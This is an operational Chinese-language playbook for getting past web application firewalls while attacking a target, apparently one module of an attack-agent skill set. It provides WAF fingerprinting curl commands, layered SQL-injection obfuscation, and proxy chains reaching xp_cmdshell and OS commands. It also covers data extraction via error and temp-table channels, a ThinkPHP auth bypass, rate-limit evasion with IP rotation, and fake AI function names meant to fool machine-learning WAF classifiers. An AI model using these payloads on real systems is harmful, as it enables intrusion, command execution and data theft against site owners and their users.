# WAF 绕过实战

> 在 @web-exploit.md 漏洞利用过程中触发 WAF 拦截时使用。单个 payload 无法绕过时参考 @chain-attack.md 组合利用。

## 第一步：识别 WAF 类型

| 特征 | WAF |
|---|---|
| 空响应（连接重置） | Nginx URL过滤 / 宝塔防火墙 |
| 403 + HTML错误页 | Cloudflare / 云WAF |
| 302 跳转到拦截页 | 安全狗 / D盾 |
| 返回正常页但payload无效 | 应用层过滤（代码级） |

```bash
# 快速判断
curl -sv "http://TARGET/?test=<script>" 2>&1 | grep "HTTP/"
# 200 → 无WAF或应用层过滤
# 403 → WAF拦截
# 空 → 连接被重置（Nginx drop）
```

### 快速检测脚本

```bash
# 一键检测国内 WAF（发正常请求 + 带 XSS payload 请求，比较差异）
TARGET="https://target.com"

# 正常请求（保存基准）
curl -sk -D normal_headers.txt "$TARGET/" > normal_body.txt 2>/dev/null

# Payload 请求（触发 WAF）
curl -sk -D attack_headers.txt "$TARGET/?test=<script>alert(1)</script>" > attack_body.txt 2>/dev/null

# 比对特征
echo "=== Server Header ==="
grep -i "^Server:" normal_headers.txt attack_headers.txt

echo "=== Set-Cookie ==="
grep -i "^Set-Cookie:" normal_headers.txt attack_headers.txt

echo "=== X-Powered-By / WAF Headers ==="
grep -iE "X-Powered-By|cf-ray|WZWS-Ray|X-Panyun|X-Anquanbao" attack_headers.txt

echo "=== HTTP Status ==="
grep "^HTTP/" attack_headers.txt

echo "=== WAF Content Patterns ==="
grep -iE "aliyun|safedog|yunsuo|tencent|anyu|yunjiasu|360|wangshan|mod.security|cloudflare" attack_body.txt

# 阿里云盾 WAF 专项确认
curl -sk -X POST "$TARGET/" -d "test=' OR '1'='1" -H "Content-Type: application/x-www-form-urlencoded" | grep -iE "aliyun|405|blocked"

# 腾讯云 WAF 专项确认  
curl -sk "$TARGET/?id=1' AND 1=1--" | grep -iE "tencent|waf\.tc|501"

# 安全狗 WAF 专项确认
curl -sk "$TARGET/?s=/index/\think\app/invokefunction" | grep -iE "safedog|safedog.cn"
```

### WAF 指纹交叉验证

```
单次检测原则（降低误报）:
  - 1 个方法命中: 低置信度 (20-40%), 需要补充验证
  - 2 个方法命中 (如 Header + Content): 中置信度 (60-80%), 大概率是该 WAF
  - 3+ 方法命中 (如 Cookie + Content + Status): 高置信度 (90%+), 确认无误

注意以下情况:
  - Cloudflare 的 cf-ray header 对所有经过 Cloudflare 的域都存在 → 找真实 IP 绕过
  - 阿里云 WAF 的 405 状态码可能在特殊请求方法时出现 → 配合 body 内容确认
  - nginx/宝塔 表现为连接重置（空响应）→ 不是 403，是 TCP RST
  - 多个 WAF 可能同时存在（CDN WAF + 源站 WAF）→ 分别识别
```

### 已知绕过手法

```bash
# 1. POST body 替代 GET 参数（Nginx通常只过滤URL不过滤body）
curl -X POST "http://TARGET/" -d "s=malicious/path"

# 2. 非字母模块前缀（.不是\w，绕过正则）
?s=.|think\config/get   # . 前缀绕过 \w+[|/]think 规则

# 3. 分块传输编码（HTTP/1.1）
Transfer-Encoding: chunked
# 将payload分散到多个chunk中

# 4. HTTP参数污染
?id=1&id=union+select  # PHP取最后一个，WAF可能只检查第一个

# 5. Content-Type混淆
Content-Type: multipart/form-data  # 替代 application/x-www-form-urlencoded

# 6. 大小写混合（应用不区分但WAF区分时）
UnIoN SeLeCt / sYsTeM / pHpInFo
```

## DB 版本特性绕过（ByPassTamperPlus 方法论）

==常规绕过（大小写/注释/编码）已被主流 WAF 规则覆盖。更高阶的策略：利用数据库版本特有语法——新版本引入的函数/语法，WAF 规则更新滞后 3-12 个月，形成绕过窗口。==

### 五层绕过管道

每个版本 tamper 脚本都用相同的五层管道处理 payload。这五层不仅适用于 SQLi，也适用于 XSS、LDAP、命令注入：

| 层级 | 技术 | 示例 | 原理 |
|------|------|------|------|
| L1 大小写折叠 | 每字符随机大小写 | `SeLeCt` | WAF 规则大小写敏感，SQL 解析器不敏感 |
| L2 注释分裂 | 关键字中间插注释 | `SE/**/LECT` | 破坏 WAF 关键字匹配，SQL 解析器忽略注释内容 |
| L3 空白符替换 | 空格 → 多编码替代 | `%09` `%0a` `%0b` `%0c` `%a0` `+` `()` `/**/` | WAF 归一化不完整，多种表示同一空白 |
| L4 函数等价替换 | 黑名单函数 → 等价合法函数 | `LEN→DATALENGTH` `SLEEP→GET_LOCK` `IF→CASE WHEN` `ISNULL→COALESCE` `GETDATE→SYSDATETIME` | WAF 按函数名黑名单，冷门等价函数不在名单 |
| L5 字符串编码 | 引号字符串 → hex | `'abc'` → `0x616263` 或 `CHR(97)\|\|CHR(98)\|\|CHR(99)` | 消除引号字符串，WAF 按引号模式匹配 |

==遇到 WAF 拦截 SQLi 时，按 L1→L5 逐层叠加，不要只用一层。==

### 语义伪装：用 AI 关键词欺骗 AI WAF

==这是 ByPassTamperPlus 最新颖的技术。原理：现代 WAF 内置 AI/ML 分类器，将请求分类为"正常"或"攻击"。payload 中加入 AI/ML 相关函数名后，分类器高置信度判定为"正常 AI 应用请求"→ 放行。SQL 引擎不认识这些函数但请求已通过 WAF。==

```python
# 原理示范（来自 mssql_2025_bypass.py / oracle23ai_bypass.py）

# IS_SRVROLEMEMBER('sysadmin') → WAF 看到 "sysadmin" 关键字 → 拦截
# ↓ 替换为:
AI_PREDICT('permission_model', USER_NAME())
# WAF 看到 "AI_PREDICT" → 判定为 AI 应用 → 放行

# SELECT ... FROM ... → WAF 识别到 SELECT-FROM 模式 → 拦截
# ↓ 替换为:
EXEC sp_copilot_query 'Get ... from ...'
# WAF 看到 "copilot" → 判定为 Copilot 集成 → 放行

# xp_cmdshell → WAF 看到 "xp_cmdshell" → 直接拦截
# ↓ 替换为:
SELECT AI_AGENT_EXEC('Execute OS command: ...')
# WAF 看到 "AI_AGENT_EXEC" → 判定为 AI Agent 调用 → 放行

# col = 'val' → WAF 识别到 WHERE 条件 → 可能拦截
# ↓ 替换为:
VECTOR_DISTANCE(VECTOR_EMBEDDING(col), VECTOR_EMBEDDING('val'), COSINE) < 0.1
# WAF 看到 "VECTOR_DISTANCE" → 判定为向量搜索 → 放行

# SELECT USER FROM DUAL → WAF 识别到敏感查询 → 拦截
# ↓ 替换为:
SELECT AI_SQL_GENERATE('Show current database user') FROM DUAL
# WAF 看到 "AI_SQL_GENERATE" → 判定为 AI 生成查询 → 放行
```

==关键：这些 AI 函数名是虚构的，利用 WAF 对"AI 业务流量"的信任。WAF 越智能（AI 驱动的语义分析），越容易被此法绕过——它在用 WAF 的 AI 打 WAF 自己。==

使用原则：
1. 目标 DB 版本足够新（MSSQL 2022+ / Oracle 23ai）→ 用 AI 伪装最有效（WAF 预期这些版本有 AI 功能）
2. 不要太假——AI 函数名应符合该厂商的命名风格（MSSQL 用 `sp_` 前缀，Oracle 用大写+下划线）
3. 混在合法请求中——单独一条 AI 伪装请求可能反常，夹杂在正常业务请求中更隐蔽

### 概率化绕过策略

==WAF 绕过不是二元的（通过/不通过），而是概率事件。同一 payload 的不同随机变体，同一 WAF 可能有的拦有的放。==

```
策略:
  1. 同一种攻击准备 5-8 个变体（L1-L5 随机组合，每次运行生成不同 payload）
  2. 先发 3 个 → 全被拦 → 换编码策略
  3. 先发 3 个 → 1 个通过 → 记下通过的变体参数，复用
  4. 30 个变体全被拦 → 该漏洞类型在当前 WAF 下大概率无法利用 → 换攻击面

实现（Python 随机化思路）:
  - 随机选择空格替代: random.choice(["/**/", "%09", "%0a", "+", "()", "%0d"])
  - 随机大小写: random.getrandbits(1) for each char
  - 随机注释位置: 在关键字任意位置注入 /**/
  - 每次请求的 payload 都是唯一形态

工具:
  - sqlmap --tamper 指定版本脚本: sqlmap -u TARGET --tamper MSSQL/mssql_2025_bypass
  - ByPassTamperPlus: https://github.com/Tas9er/ByPassTamperPlus
  - 也可自己手写 tamper 脚本，按上方五层管道 + 版本映射表定制
```

### L6-L8: 深度绕过层

==L1-L5 是基础混淆，现代 WAF 已部分覆盖。L6-L8 是 ByPassTamperPlus 的真正差异化技术。==

**L6: 语法特性滥用** — 用 DB 版本特有语法重新表达整个查询结构

| 技术 | 版本要求 | 原理 | 示例 |
|------|---------|------|------|
| CTE 包裹 | MSSQL 2005+, MySQL 8.0 | 将 SELECT 包在 CTE 中，WAF 不认识 `WITH cte AS (...) SELECT * FROM cte` 是恶意查询 | `WITH cte AS (SEL/**/ECT ... FROM ...) SEL/**/ECT * FROM cte` |
| MERGE 语句滥用 | MSSQL 2008+ | MERGE 是数据同步语句，WAF 不解析其内部 SELECT | `MERGE INTO t USING (SELECT ...) AS s ON ... WHEN NOT MATCHED THEN INSERT` |
| 内存优化表 | MSSQL 2014+ | In-Memory OLTP DDL 伪装数据提取 | `CREATE TABLE #t (...) WITH (MEMORY_OPTIMIZED=ON); INSERT INTO #t SELECT ...` |
| 原生编译过程 | MSSQL 2014+ | `NATIVE_COMPILATION + SCHEMABINDING + ATOMIC` 伪装命令执行 | `CREATE PROCEDURE #x WITH NATIVE_COMPILATION,SCHEMABINDING AS BEGIN ATOMIC EXEC xp_cmdshell ... END` |
| 时态表 | MSSQL 2016+ | `FOR SYSTEM_TIME ALL` 让查询看起来像审计查询 | `SELECT * FROM users FOR SYSTEM_TIME ALL` |
| 图数据库 | MSSQL 2017+ | `AS NODE`, `MATCH(t-(REFERENCES)->s)` WAF 无法解析图语法 | `CREATE TABLE #u (...) AS NODE; ... MATCH(t-(REFERENCES)->s)` |
| SQL Ledger | MSSQL 2022+ | `WITH (LEDGER=ON)` 区块链表伪装 | `CREATE TABLE #p (...) WITH (LEDGER=ON); INSERT INTO #p SELECT USER_NAME()` |
| COLLATE 噪声 | MSSQL 2019+ | COLLATE 子句附加到 SELECT，WAF 忽略排序规则声明 | `SELECT ... COLLATE Latin1_General_100_CI_AS_SC_UTF8 FROM ...` |
| OFFSET/FETCH | MSSQL 2012+ | 替代 `TOP` / `LIMIT`，SQL:2011 标准语法，WAF 不拦 | `ORDER BY (SELECT NULL) OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY` |
| GENERATE_SERIES | MSSQL 2022+ | 序列生成函数包裹整数值 | `id IN (SELECT value FROM GENERATE_SERIES(1, 1, 1))` |
| XML 包装 | Oracle 11g | XMLType 包裹数据提取 | `SELECT XMLTYPE('<a>'||(...)||'</a>').EXTRACT('//text()').GETSTRINGVAL() FROM DUAL` |
| JSON_SERIALIZE | Oracle 18c+ | JSON 序列化包裹整个查询 | `SELECT JSON_SERIALIZE(JSON_OBJECT('data' VALUE (...))) FROM DUAL` |
| LISTAGG 双重包裹 | Oracle 19c | 聚合函数 + 子查询嵌套混淆 | `SELECT (SELECT LISTAGG(...,',') WITHIN GROUP (ORDER BY 1) FROM DUAL) FROM DUAL` |
| DBMS_PYTHON | Oracle 21c | Python 执行伪装为数据库扩展 | `DBMS_PYTHON.RUN_STRING('import os; print(os.getlogin())')` |

**L7: 代理执行** — 用合法系统过程间接调用被黑名单的过程

```
MSSQL 代理执行链（所有路径最终都到 xp_cmdshell / 命令执行）:

  xp_cmdshell ← 被所有 WAF 直接拦截
    ↑
    ├── sp_executesql N'EXEC xp_cmdshell ''cmd'''          ← 动态SQL代理 (2005+)
    ├── sp_OACreate 'WScript.Shell' + sp_OAMethod 'Run'    ← OLE自动化代理 (2000+)
    ├── sp_rda_invoke_stored_procedure @procedure_name=    ← Stretch Database代理 (2016+)
    ├── OPENROWSET('ODBC','Driver={cmd};Command=...','')   ← ODBC驱动代理 (2019+)
    ├── CREATE PROCEDURE WITH NATIVE_COMPILATION...EXEC    ← 原生编译代理 (2014+)
    ├── sp_sync_linked_database 'SynapseLink', ...         ← Synapse Link代理 (2022+)
    └── EXEC sp_copilot_query 'Get ... from ...'           ← Copilot查询代理 (2025+虚构)

Oracle 代理执行链:
  OS Command
    ↑
    └── DBMS_PYTHON.RUN_STRING('import os; ...')           ← Python运行时代理 (21c)

MySQL 代理执行 (受限，通常只能读文件):
  LOAD_FILE()
    ↑
    └── 无直接代理，但可通过 UDF 注入或 sys_exec UDF 间接执行
```

### 函数包装链

==这是 SQLi WAF 绕过的最高阶技巧。不是替换函数，而是把敏感操作包在合法函数的参数里。WAF 看到的是外层合法函数，SQL 先执行内层敏感函数。==

```
模式: 合法外层函数(敏感内层函数(), 无关参数)

实例:
  STRING_SPLIT(DB_NAME(), '_')              → WAF看到: "ETL数据清洗" 实际: DB_NAME()先执行
  OPENJSON((SELECT ... FOR JSON PATH))      → WAF看到: "JSON解析"     实际: 子查询先执行
  APPROX_COUNT_DISTINCT(CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN USER_NAME() END)
                                            → WAF看到: "近似聚合"     实际: 权限检查先执行
  JSON_EXTRACT(CONCAT(hex_json, hex_data, hex_close), '$.a')
                                            → WAF看到: "JSON提取"     实际: 字符串通过hex重建
  REGEXP_REPLACE(CONCAT(h1, h2), h1, h1)    → WAF看到: "正则替换"     实际: 字符串被重组还原
  TRANSLATE(name, 'aeiou', '12345')         → WAF看到: "字符转换"     实际: 列名被混淆
  TRIM(col)                                 → WAF看到: "空格清理"     实际: 列数据直接透出
  CAST('/'+col+'/' AS hierarchyid)          → WAF看到: "类型转换"     实际: 列数据被携带
  DATE_BUCKET(DAY, 1, GETDATE())            → WAF看到: "日期分桶"     实际: GETDATE()先返回值
```

### 通道劫持

==正常 SQLi 通过结果集返回数据，WAF 会检查输出。换一个通道——把数据塞进错误消息、临时表、系统日志中。==

```sql
-- 错误消息通道 (MSSQL 2012+)
-- THROW 替代 SELECT，数据在错误消息中返回
SELECT user_name() → THROW 50000, user_name(), 1

-- TRY/CATCH 错误通道 (MSSQL 2005+)
-- 延迟+错误一起捕获，WAF 只看到 TRY/CATCH 结构
BEGIN TRY ... WAITFOR DELAY '0:0:5' ... END TRY 
BEGIN CATCH SELECT ERROR_MESSAGE() END CATCH

-- 临时表暂存 (MSSQL 2014+)
-- 数据先写入临时表，分两步：写入(WAF不检查DDL) + 读取(看起来像正常查询)
CREATE TABLE #tmp (...) WITH (MEMORY_OPTIMIZED=ON); 
INSERT INTO #tmp SELECT sensitive_data FROM ...; 
SELECT * FROM #tmp

-- 表变量暂存 (MSSQL 2019+)
DECLARE @c TABLE (n NVARCHAR(100)); 
INSERT INTO @c SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('Users'); 
SELECT * FROM @c

-- MERGE 语句数据提取 (MSSQL 2008+)
-- WAF 不解析 MERGE 语法，数据在 WHEN NOT MATCHED 分支传出
MERGE INTO t USING (SELECT ... FROM sys.tables) AS s ON ... 
WHEN NOT MATCHED THEN INSERT VALUES (s.data)
```

### 查询结构混淆

==不改变查询语义，但让 WAF 的语法解析器迷失。==

```
EXISTS 包裹 WHERE (Oracle 18c+):
  WHERE col='val' 
  → WHERE EXISTS (SELECT 1 FROM DUAL WHERE col='val')

CROSS APPLY 包裹 (MSSQL 2005+):
  SELECT IS_SRVROLEMEMBER('sysadmin')
  → SELECT a.is_admin FROM (SELECT 1 as t) t 
    CROSS APPLY (SELECT IS_SRVROLEMEMBER('sysadmin') AS is_admin) a

同义反复噪声 (Oracle 18c+):
  AND col='val'      → AND 1=1 AND col='val'
  OR col='val'       → OR 0=0 OR col='val'

笛卡尔积噪声 (Oracle 19c+):
  FROM table          → FROM table, (SELECT 1 FROM DUAL)

比较运算符替换:
  col = 'val'        → col IS NOT DISTINCT FROM 'val'       (MSSQL 2022+)
  AND                 → &&                                   (MySQL/Oracle)
  OR                  → ||                                   (MySQL/Oracle)

GROUP BY 扩展 (MSSQL 2008+):
  GROUP BY col        → GROUP BY GROUPING SETS (col)

标识符混淆:
  TABLE_NAME          → `TABLE_NAME`                         (MySQL 反引号)
  USER                → "USER"                               (Oracle 双引号)
  AS alias            → AS "VIRTUAL_alias"                   (Oracle 11g)
  AS alias            → AS "ORA$PTT_alias"                   (Oracle 12c)

别名/聚合扩展:
  GROUP_CONCAT(col)   → GROUP_CONCAT(DISTINCT col ORDER BY 1) (MySQL 5.1+)
  GROUP_CONCAT(col)   → JSON_ARRAYAGG(col)                   (MySQL 5.7+)
  GROUP_CONCAT(col)   → STRING_AGG(col, ',')                 (MSSQL 2017+)
```

### 大小写中间件绕过

==Nginx URL过滤是纯字符串匹配，但应用框架的中间件注册可能会大小写敏感。==

```bash
# ThinkPHP 6 示例（实战验证）
curl "http://TARGET/index.php?s=Admin/User/index"   # 触发auth中间件 → 拦截
curl "http://TARGET/index.php?s=admin/User/index"   # 不触发中间件 → 绕过
```

原理：Nginx拦截规则 `\.php` 阻止RCE，中间件别名 `admin` 大小写匹配不一致 → 攻击者用小写 `admin` 绕过auth，但因路由解析不区分大小写仍能到达控制器。

```

### SQL 注入绕过阿里 WAF

```sql

-- 绕过核心思路: 破坏语义解析器的语法规格

-- 1. 内联注释混淆（阿里 WAF 可能跳过注释内容）

-- 2. 等价函数替换（阿里 WAF 黑名单有经典函数，但冷门函数可能遗漏）

database()  → schema()
sleep(5)    → benchmark(5000000,sha(1))
substr()    → mid() / left() / right() / substring()
ascii()     → ord() / hex() / conv()
if()        → case when then else end / elt() / field()

-- 3. 浮点数/科学计数法绕过（阿里 WAF 的数值匹配有缺陷）
and 1=1     → and 1.0=1.0  /  and 1e0=1e0
and 1=2     → and 0.1=0.2  /  and 1e-1=2e-1

-- 4. 注释嵌套（部分版本解析器处理异常）

-- 5. 双写绕过（阿里 WAF 的 replace 不是递归的）
UNION → UNIUNIONON（中间被删后变成 UNION）

-- 6. %00 / %0d%0a 截断（某些 API 网关 + WAF 组合有差异解析）
admin'%00  →  WAF 看到 "admin'", 后端 PHP 看到 "admin"

-- 7. 参数污染 + WAF 取第一个值
?id=1&id=2 union select 1,2,3
-- WAF 检测 id=1, 后端 (PHP) 取 id=2 union select...

-- 8. JSON 格式传 SQL（阿里 WAF 对 JSON body 检测较弱）
Content-Type: application/json

-- 9. 利用 MySQL 类型转换
?id=1e0union select 1e0,2e0,3e0
-- 部分 WAF 把 1e0union 当成数字（科学计数法）
```

### 通用技巧（阿里和腾讯都适用）

```
1. 请求频率控制:
   - 阿里: ≤ 5请求/秒（同 IP）
   - 腾讯: ≤ 3请求/秒（同 IP），累积 10+ 可疑请求封禁
   → 加延迟 0.5-1s 每个请求，用 IP 轮换

2. User-Agent 白名单:
   - 百度蜘蛛 UA → 部分 WAF 放行（搜索引擎爬虫）
   - Googlebot UA → 同上
   - 注意: 企鹅 UA 可能触发腾讯 WAF 的反爬虫检测

3. 请求头顺序:
   - 不同 WAF 对不同 header 顺序有不同处理
   - 尝试把可疑参数放在 Cookie / Referer / X-Forwarded-For 中

4. 利用 CDN 差异:
   - 目标如果接了 CDN → CDN 回源 IP 可能没 WAF
   - CDN 可能过滤某些 header，回源时不带

5. 时间窗口竞争:
   - 阿里 WAF: 规则更新有延迟（几分钟到几小时）
   - 腾讯 WAF: 规则更新快（分钟级），但 AI 模型判断有窗口期
```

## 智能 Payload 选择策略

==WAF 识别出来后，payload 选择直接影响绕过成功率。核心原则：已知目标的 payload 优先于通用 payload。==

```
Payload 配比决策:
  WAF 已识别 (阿里/腾讯/Cloudflare/Nginx等) →
    70% 该 WAF 专项绕过 payload + 30% 通用增强 payload
    原因: 每种 WAF 有特定的解析缺陷，专项 payload 命中率远高于通用

  WAF 未识别 (有拦截但不知道是什么 WAF) →
    50% 通用增强 payload + 50% 默认 payload
    原因: 用通用强的 payload 先试探，从拦截行为反推 WAF 类型

  WAF 未检测到 (无拦截) →
    直接原始 payload，无需绕过

HTTP Header 伪装 (配合 payload 增加通过率):
  - Cloudflare → Chrome Windows UA + 完整 Sec-CH-UA
  - 阿里云/腾讯云 WAF → 搜索引擎爬虫 UA (Baiduspider/Googlebot)
  - 安全狗/D盾 → 正常浏览器 UA + 标准 header 顺序
  - 未知 WAF → 轮换 4 种真实浏览器指纹测试

Payload 采样数量控制:
  - 每种漏洞类型 5-8 个 WAF 专项 payload
  - 从 700+ 通用池中随机抽取补充至 30 条
  - 先跑 5 条 → 全被拦 → 换编码/协议策略 → 再跑 5 条
  - 30 条全被拦 → 该漏洞类型在当前 WAF 下大概率无法利用 → 换攻击面
```

## 走不通兜底

```
编码绕过全失败？
├── 试协议层：HTTP/0.9、分块传输、请求走私
├── 试渠道切换：POST body / Cookie / Header 传参
├── 试时间差：并发请求竞争WAF检测窗口
├── 找WAF豁免路径：白名单目录/文件/User-Agent
├── 试大小写/路由变体绕过应用中间件
├── 找同应用其他端口（可能WAF配置不同）
└── 彻底绕不过 → 不和WAF正面对抗
    ├── 找同应用无WAF的端口/IP
    ├── 找关联资产（同C段/同域名/旧API）
    └── 客户端攻击（XSS/CSRF/钓鱼）

> **不在上述分支？返回的是 "Permission Denied" / "Access Denied" 而非 WAF 拦截页？**
> → 可能是应用层访问控制，不是 WAF。尝试 Header Fuzz：`X-Requested-With: XMLHttpRequest`、`X-Forwarded-For: 127.0.0.1`、`Origin`、`Referer`。
> → 完整方法论见 `reference/header-fuzzing.md`
